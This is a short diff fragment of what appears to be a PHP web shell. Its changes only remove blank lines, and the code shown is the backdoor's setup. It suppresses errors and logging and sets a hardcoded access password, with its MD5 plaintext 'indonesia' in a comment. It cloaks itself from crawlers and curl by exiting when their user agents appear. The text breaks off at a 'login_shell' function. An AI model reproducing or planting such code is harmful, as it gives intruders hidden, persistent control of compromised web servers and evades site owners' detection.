@@ -1,5 +1,4 @@
 <?php
-
 session_start();
 @error_reporting(0);
 @set_time_limit(0);
@@ -7,19 +6,15 @@ session_start();
 if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 	@set_magic_quotes_runtime(0);
 }
-
 @clearstatcache();
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
-
 $password = "cda2c99fbf5e19f20d331299c15a4491"; # md5: indonesia
-
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 $FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
-
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
     if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
@@ -27,7 +22,6 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
         exit;
     }
 }
-
 function login_shell() {
 ?>
 <?php
